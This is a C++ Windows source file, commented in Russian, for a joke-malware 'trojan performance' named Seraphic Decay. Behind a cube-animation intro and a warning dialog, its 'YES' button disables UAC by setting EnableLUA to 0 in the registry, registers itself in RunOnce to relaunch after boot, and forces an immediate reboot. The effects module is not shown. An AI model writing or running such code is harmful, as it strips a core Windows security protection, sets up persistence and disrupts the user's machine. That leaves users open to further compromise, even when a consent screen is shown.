#pragma execution_character_set("utf-8")
#define _WIN32_WINNT 0x0601
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <mmsystem.h>
#include <gdiplus.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <cstdio>
#include <cmath>

#include "effects.h" // Подключаем наш модуль эффектов

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:wWinMainCRTStartup")

using namespace Gdiplus;

// ============================================================
// ГЛОБАЛЫ И НАСТРОЙКИ
// ============================================================
HINSTANCE g_hInst = nullptr;
HWND g_hWndIntro = nullptr;
HWND g_hWndWarn = nullptr;
bool g_isRunning = false;
DWORD g_startTime = 0;

// Угол вращения 3D-куба
float g_cubeAngle = 0.0f;

// ============================================================
// СИСТЕМНЫЕ ФУНКЦИИ (UAC, РЕЕСТР, ПЕРЕЗАГРУЗКА)
// ============================================================
void SetRegDword(HKEY root, const wchar_t* sub, const wchar_t* val, DWORD data) {
    HKEY h; if (RegCreateKeyExW(root, sub, 0, nullptr, 0, KEY_SET_VALUE, nullptr, &h, nullptr) == ERROR_SUCCESS) {
        RegSetValueExW(h, val, 0, REG_DWORD, (const BYTE*)&data, sizeof(data));
        RegCloseKey(h);
    }
}

void DisableUAC() {
    // Отключаем UAC (EnableLUA = 0)
    SetRegDword(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"EnableLUA", 0);
}

void AddToRunOnce() {
    wchar_t path[MAX_PATH]; GetModuleFileNameW(nullptr, path, MAX_PATH);
    HKEY h;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &h, nullptr) == ERROR_SUCCESS) {
        RegSetValueExW(h, L"SeraphicDecay", 0, REG_SZ, (const BYTE*)path, (DWORD)((wcslen(path)+1)*sizeof(wchar_t)));
        RegCloseKey(h);
    }
}

void ForceReboot() {
    HANDLE hToken; TOKEN_PRIVILEGES tkp;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL);
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}

// ============================================================
// ОКНО 1: "ТРОЯН" (ПРИВЕТСТВИЕ)
// ============================================================
LRESULT CALLBACK IntroProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    static int hoverBtn = 0;

    switch (m) {
    case WM_CREATE:
        SetTimer(h, 1, 16, nullptr); // Таймер для анимации куба (~60 FPS)
        return 0;

    case WM_TIMER:
        if (w == 1) {
            g_cubeAngle += 0.05f;
            InvalidateRect(h, nullptr, FALSE);
        }
        return 0;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(h, &ps);
        {
            Graphics graphics(hdc);
            graphics.SetSmoothingMode(SmoothingModeAntiAlias);

            RECT rc; GetClientRect(h, &rc);
            // Темный фон
            SolidBrush bg(Color(255, 15, 15, 20));
            graphics.FillRectangle(&bg, 0, 0, rc.right, rc.bottom);

            // Рисуем 3D куб сверху (вызов из модуля effects)
            Effects::Draw3DCube(graphics, rc.right / 2, 100, g_cubeAngle);

            // Текст
            FontFamily fontFamily(L"Segoe UI");
            Font fontTitle(&fontFamily, 24, FontStyleBold, UnitPixel);
            SolidBrush whiteBrush(Color(255, 255, 255, 255));
            SolidBrush redBrush(Color(255, 255, 50, 50));

            graphics.DrawString(L"Seraphic Decay", -1, &fontTitle, PointF(20, 200), &whiteBrush);
            
            Font fontText(&fontFamily, 16, FontStyleRegular, UnitPixel);
            graphics.DrawString(L"Это перформанс, который уничтожит твоё время.\nЕсли вы случайно нажали, срочно\nзакрывайте программу.", -1, &fontText, PointF(20, 240), &redBrush);

            // Кнопки
            SolidBrush btnRun(hoverBtn == 1 ? Color(255, 100, 200, 100) : Color(255, 80, 150, 80));
            graphics.FillRectangle(&btnRun, rc.right - 160, rc.bottom - 60, 140, 40);
            graphics.DrawString(L"Запустить", -1, &fontText, PointF(rc.right - 140, rc.bottom - 50), &whiteBrush);

            SolidBrush btnClose(hoverBtn == 2 ? Color(255, 80, 80, 80) : Color(255, 40, 40, 40));
            graphics.FillRectangle(&btnClose, 20, rc.bottom - 60, 100, 40);
            graphics.DrawString(L"Закрыть", -1, &fontText, PointF(40, rc.bottom - 50), &whiteBrush);
        }
        EndPaint(h, &ps);
        return 0;
    }

    case WM_MOUSEMOVE: {
        int x = LOWORD(l), y = HIWORD(l);
        RECT rc; GetClientRect(h, &rc);
        
        int hb = 0;
        if (x > rc.right - 160 && x < rc.right - 20 && y > rc.bottom - 60 && y < rc.bottom - 20) hb = 1;
        if (x > 20 && x < 120 && y > rc.bottom - 60 && y < rc.bottom - 20) hb = 2;

        if (hb != hoverBtn) { hoverBtn = hb; InvalidateRect(h, nullptr, FALSE); }
        if (hb) SetCursor(LoadCursor(nullptr, IDC_HAND)); else SetCursor(LoadCursor(nullptr, IDC_ARROW));
        return 0;
    }

    case WM_LBUTTONDOWN: {
        int x = LOWORD(l), y = HIWORD(l);
        RECT rc; GetClientRect(h, &rc);

        // Перетаскивание окна за верхнюю часть
        if (y < 100) {
            ReleaseCapture();
            SendMessage(h, WM_NCLBUTTONDOWN, HTCAPTION, 0);
            return 0;
        }

        if (x > rc.right - 160 && x < rc.right - 20 && y > rc.bottom - 60 && y < rc.bottom - 20) {
            ShowWindow(h, SW_HIDE);
            ShowWindow(g_hWndWarn, SW_SHOW);
        }
        if (x > 20 && x < 120 && y > rc.bottom - 60 && y < rc.bottom - 20) {
            PostQuitMessage(0);
        }
        return 0;
    }
    case WM_DESTROY: PostQuitMessage(0); return 0;
    }
    return DefWindowProcW(h, m, w, l);
}

// ============================================================
// ОКНО 2: "ПРЕДУПРЕЖДЕНИЕ"
// ============================================================
LRESULT CALLBACK WarnProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    static int hoverBtn = 0;
    switch (m) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(h, &ps);
        {
            Graphics graphics(hdc);
            RECT rc; GetClientRect(h, &rc);
            
            SolidBrush bg(Color(255, 40, 10, 10));
            graphics.FillRectangle(&bg, 0, 0, rc.right, rc.bottom);

            FontFamily fontFamily(L"Segoe UI");
            Font fontTitle(&fontFamily, 20, FontStyleBold, UnitPixel);
            SolidBrush whiteBrush(Color(255, 255, 255, 255));

            graphics.DrawString(L"ВНИМАНИЕ!", -1, &fontTitle, PointF(20, 20), &whiteBrush);
            
            Font fontText(&fontFamily, 16, FontStyleRegular, UnitPixel);
            graphics.DrawString(L"После нажатия 'ДА' компьютер перезагрузится.\nUAC будет отключен. Игра начнется снова.\nДальнейшие действия необратимы.", -1, &fontText, PointF(20, 60), &whiteBrush);

            SolidBrush btnYes(hoverBtn == 1 ? Color(255, 200, 50, 50) : Color(255, 150, 20, 20));
            graphics.FillRectangle(&btnYes, rc.right - 140, rc.bottom - 60, 120, 40);
            graphics.DrawString(L"ДА", -1, &fontTitle, PointF(rc.right - 110, rc.bottom - 55), &whiteBrush);

            SolidBrush btnNo(hoverBtn == 2 ? Color(255, 80, 80, 80) : Color(255, 40, 40, 40));
            graphics.FillRectangle(&btnNo, 20, rc.bottom - 60, 120, 40);
            graphics.DrawString(L"НЕТ", -1, &fontTitle, PointF(50, rc.bottom - 55), &whiteBrush);
        }
        EndPaint(h, &ps);
        return 0;
    }
    case WM_MOUSEMOVE: {
        int x = LOWORD(l), y = HIWORD(l); RECT rc; GetClientRect(h, &rc);
        int hb = 0;
        if (x > rc.right - 140 && x < rc.right - 20 && y > rc.bottom - 60 && y < rc.bottom - 20) hb = 1;
        if (x > 20 && x < 140 && y > rc.bottom - 60 && y < rc.bottom - 20) hb = 2;
        if (hb != hoverBtn) { hoverBtn = hb; InvalidateRect(h, nullptr, FALSE); }
        if (hb) SetCursor(LoadCursor(nullptr, IDC_HAND)); else SetCursor(LoadCursor(nullptr, IDC_ARROW));
        return 0;
    }
    case WM_LBUTTONDOWN: {
        int x = LOWORD(l), y = HIWORD(l); RECT rc; GetClientRect(h, &rc);
        if (x > rc.right - 140 && x < rc.right - 20 && y > rc.bottom - 60 && y < rc.bottom - 20) {
            // НАЖАТИЕ НА "ДА" - СТАРТ ПЕРФОРМАНСА (С ПЕРЕЗАГРУЗКОЙ)
            
            // 1. Отключаем UAC
            DisableUAC();
            
            // 2. Добавляем в автозагрузку (RunOnce), чтобы после ребута запустилось само
            AddToRunOnce();
            
            // 3. Перезагружаем ПК
            MessageBoxW(nullptr, L"Подготовка к перезагрузке...", L"System", MB_OK | MB_ICONWARNING);
            ForceReboot();
        }
        if (x > 20 && x < 140 && y > rc.bottom - 60 && y < rc.bottom - 20) {
            ShowWindow(h, SW_HIDE);
            ShowWindow(g_hWndIntro, SW_SHOW);
        }
        return 0;
    }
    }
    return DefWindowProcW(h, m, w, l);
}

// ============================================================
// ТОЧКА ВХОДА
// ============================================================
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR lpCmdLine, int) {
    g_hInst = hInst;

    // Инициализация GDI+ через наш модуль
    Effects::Init();

    // Регистрация классов окон
    WNDCLASSW wc = {};
    wc.hInstance = hInst;
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);

    wc.lpfnWndProc = IntroProc;
    wc.lpszClassName = L"IntroWnd";
    RegisterClassW(&wc);

    wc.lpfnWndProc = WarnProc;
    wc.lpszClassName = L"WarnWnd";
    RegisterClassW(&wc);

    // Создание окон
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int w = 500, h = 400;

    g_hWndIntro = CreateWindowExW(WS_EX_TOPMOST, L"IntroWnd", L"Seraphic Decay", WS_POPUP, (sw-w)/2, (sh-h)/2, w, h, nullptr, nullptr, hInst, nullptr);
    g_hWndWarn  = CreateWindowExW(WS_EX_TOPMOST, L"WarnWnd", L"Warning", WS_POPUP, (sw-w)/2, (sh-h)/2, w, h, nullptr, nullptr, hInst, nullptr);

    ShowWindow(g_hWndIntro, SW_SHOW);
    UpdateWindow(g_hWndIntro);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    Effects::Shutdown();
    return 0;
}
